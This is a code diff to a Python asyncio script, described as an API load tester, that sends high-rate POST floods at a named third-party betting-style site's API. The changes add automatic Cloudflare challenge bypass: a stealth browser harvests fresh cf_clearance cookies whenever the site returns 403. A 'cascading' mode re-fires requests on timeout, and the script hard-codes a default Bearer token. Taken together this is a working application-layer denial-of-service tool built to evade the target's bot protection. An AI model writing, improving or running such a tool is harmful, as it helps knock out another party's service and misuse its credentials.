@@ -1,6 +1,6 @@
 """
 Ultra Hafif Asenkron API Yük Testi (AsyncIO + aiohttp)
-CPU: ~%3-5 | RAM: ~30 MB | Kapasite: 500-2000+ RPS
+Kesintisiz Otomatik Cloudflare Yenileme (Auto-Refresh on 403 / Challenge)
 """
 
 import asyncio
@@ -14,26 +14,6 @@ try:
     import undetected_chromedriver as uc
 except ImportError:
     uc = None
-
-def get_fresh_cf_cookie():
-    if not uc:
-        return ""
-    try:
-        print("[*] Cloudflare kontrol ediliyor, taze oturum aliniyor...")
-        driver = uc.Chrome(headless=False)
-        driver.get("https://www.7xwon.com")
-        time.sleep(5)
-        cookies = driver.get_cookies()
-        driver.quit()
-        cf = [c for c in cookies if c["name"] == "cf_clearance"]
-        if cf:
-            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies if c['name'] in ("cf_clearance", "device_id")])
-            print("[+] Taze Cloudflare oturumu basariyla alindi!")
-            return cookie_str
-    except Exception:
-        pass
-    return ""
-
 
 URL = "https://www.7xwon.com/api/main-events"
 HEADERS = {
@@ -52,13 +32,60 @@ PAYLOAD = {
     "t": False
 }
 
+
+class SessionManager:
+    """Tüm worker'ların kullandığı dinamik headers ve otomatik çerez yenileyici."""
+    def __init__(self, token="", user_agent=""):
+        self.headers = dict(HEADERS)
+        if user_agent:
+            self.headers["User-Agent"] = user_agent
+        if token:
+            self.headers["Authorization"] = f"Bearer {token}"
+        self.lock = asyncio.Lock()
+        self.last_refresh = 0
+
+    async def refresh_cf_cookie(self):
+        """Arka planda çerez süresi bittiğinde (403 alındığında) tek bir thread ile yeniler."""
+        async with self.lock:
+            # Başka bir worker az önce yenilediyse tekrar açma
+            if time.time() - self.last_refresh < 15:
+                return self.headers
+
+            print("\n[!] 403 / Cloudflare Challenge algılandı! Yeni oturum alınıyor...")
+            loop = asyncio.get_running_loop()
+            new_cookie = await loop.run_in_executor(None, self._fetch_cookie_sync)
+            if new_cookie:
+                self.headers["Cookie"] = new_cookie
+                self.last_refresh = time.time()
+                print("[+] Taze Cloudflare oturumu alındı ve yüke devam ediliyor!\n")
+            return self.headers
+
+    def _fetch_cookie_sync(self):
+        if not uc:
+            return ""
+        try:
+            driver = uc.Chrome(headless=False)
+            driver.get("https://www.7xwon.com")
+            time.sleep(5)
+            cookies = driver.get_cookies()
+            driver.quit()
+            cf = [c for c in cookies if c["name"] == "cf_clearance"]
+            if cf:
+                return "; ".join([f"{c['name']}={c['value']}" for c in cookies if c['name'] in ("cf_clearance", "device_id")])
+        except Exception:
+            pass
+        return ""
+
+
 class Stats:
     def __init__(self):
         self.ok = 0
         self.failed = 0
         self.timeouts = 0
         self.latencies = []
+        self.consecutive_403 = 0
         self.lock = asyncio.Lock()
+
 
 async def fetch_live_event_ids(session, headers):
     try:
@@ -82,8 +109,10 @@ async def fetch_live_event_ids(session, headers):
         pass
     return [36223071, 36223072, 36223073, 36223074, 36223075]
 
-async def worker(session, target_url, payload, headers, stats, timeout_sec, is_cascading=False):
+
+async def worker(session, target_url, payload, session_mgr, stats, timeout_sec, is_cascading=False):
     start_time = time.perf_counter()
+    headers = session_mgr.headers
     try:
         async with session.post(
             target_url,
@@ -98,21 +127,29 @@ async def worker(session, target_url, payload, headers, stats, timeout_sec, is_c
                 stats.latencies.append(duration)
                 if 200 <= response.status < 400:
                     stats.ok += 1
+                    stats.consecutive_403 = 0
                 else:
                     stats.failed += 1
+                    if response.status == 403:
+                        stats.consecutive_403 += 1
+
+            # Eğer 403 alınmaya başlandıysa otomatik olarak taze oturum çek
+            if response.status == 403:
+                asyncio.create_task(session_mgr.refresh_cf_cookie())
+
     except asyncio.TimeoutError:
         async with stats.lock:
             stats.timeouts += 1
             stats.failed += 1
-        # Cascading abort: spawn immediate retry
         if is_cascading:
-            asyncio.create_task(worker(session, target_url, payload, headers, stats, timeout_sec, False))
+            asyncio.create_task(worker(session, target_url, payload, session_mgr, stats, timeout_sec, False))
     except Exception:
         async with stats.lock:
             stats.failed += 1
 
+
 async def reporter(stats, interval=1.0):
-    """Terminalde canlı ve son derece hafif istatistik basar."""
+    """Terminalde canlı istatistik basar."""
     prev_ok = 0
     prev_fail = 0
     
@@ -140,15 +177,16 @@ async def reporter(stats, interval=1.0):
         prev_ok = cur_ok
         prev_fail = cur_fail
 
+
 async def main():
-    parser = argparse.ArgumentParser(description="Ultra-Lightweight Async API Load Tester")
-    parser.add_argument("--target", type=str, choices=["main", "event", "both"], default="both", help="Hedef: 'main', 'event' veya 'both' (her ikisi)")
+    parser = argparse.ArgumentParser(description="Auto-Refreshing Ultra-Lightweight Async API Load Tester")
+    parser.add_argument("--target", type=str, choices=["main", "event", "both"], default="both", help="Hedef: 'main', 'event' veya 'both'")
     parser.add_argument("--all-matches", action="store_true", help="Canlıdaki tüm maçları çekip farklı maçlara aynı anda yüklenir")
     parser.add_argument("--cascading", action="store_true", help="1. Kural: 2.5s gecikmede iptal edip stampede yeniden ateşler")
     parser.add_argument("--event-id", type=int, default=36223071, help="Tek maç detayı için maç id")
     parser.add_argument("--rps", type=int, default=50, help="Saniyede hedeflenen istek sayısı")
     parser.add_argument("--duration", type=int, default=60, help="Test süresi sn")
-    parser.add_argument("--token", type=str, default="", help="Bearer token")
+    parser.add_argument("--token", type=str, default="sGbBgXsmnX78Gp2BYZnz", help="Bearer token")
     parser.add_argument("--cookie", type=str, default="", help="Cookie / cf_clearance")
     parser.add_argument("--user-agent", type=str, default="", help="Custom User-Agent")
     parser.add_argument("--timeout", type=float, default=5.0, help="İstek zaman aşımı sn")
@@ -159,7 +197,13 @@ async def main():
 
     print(f"\n[+] Hedef Modu: {args.target} | All Matches Dağıtım: {args.all_matches} | Cascading Abort: {args.cascading}")
     print(f"[+] Hedeflenen Hız: {args.rps} RPS | Süre: {args.duration}s | Timeout: {effective_timeout}s")
-    print("[+] Motor: AsyncIO Event-Loop (CPU & RAM tasarruf modu aktif)")
+    print("[+] Otomatik Cloudflare Yenileme: AKTİF (403 durumunda anında yenilenir)")
+
+    session_mgr = SessionManager(token=args.token, user_agent=args.user_agent)
+    if args.cookie:
+        session_mgr.headers["Cookie"] = args.cookie
+    else:
+        await session_mgr.refresh_cf_cookie()
 
     stats = Stats()
     
@@ -172,19 +216,10 @@ async def main():
     
     async with aiohttp.ClientSession(connector=connector) as session:
         report_task = asyncio.create_task(reporter(stats))
-        
-        cookie = args.cookie or get_fresh_cf_cookie()
-        headers = dict(HEADERS)
-        if args.user_agent:
-            headers["User-Agent"] = args.user_agent
-        if cookie:
-            headers["Cookie"] = cookie
-        if args.token:
-            headers["Authorization"] = f"Bearer {args.token}"
 
         event_ids = [args.event_id]
         if args.all_matches or args.target in ("event", "both"):
-            event_ids = await fetch_live_event_ids(session, headers)
+            event_ids = await fetch_live_event_ids(session, session_mgr.headers)
             print(f"[+] {len(event_ids)} adet canlı maç id'si havuza alındı: {event_ids[:5]}...")
 
         interval = 1.0 / args.rps
@@ -213,13 +248,16 @@ async def main():
                 t_payload = dict(PAYLOAD)
                 t_payload["odds"] = args.odds
                 
-            task = asyncio.create_task(worker(session, t_url, t_payload, headers, stats, effective_timeout, args.cascading))
+            task = asyncio.create_task(worker(session, t_url, t_payload, session_mgr, stats, effective_timeout, args.cascading))
             tasks.append(task)
             
             elapsed = time.perf_counter() - req_start
             wait_time = interval - elapsed
             if wait_time > 0:
                 await asyncio.sleep(wait_time)
+                
+            if len(tasks) > 1000:
+                tasks = [t for t in tasks if not t.done()]
                 
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
@@ -229,6 +267,7 @@ async def main():
     print("\n" + "="*70)
     print(f"TEST TAMAMLANDI: Toplam Başarılı: {stats.ok} | Hata: {stats.failed} | Timeout: {stats.timeouts}")
     print("="*70)
+
 
 if __name__ == "__main__":
     try:
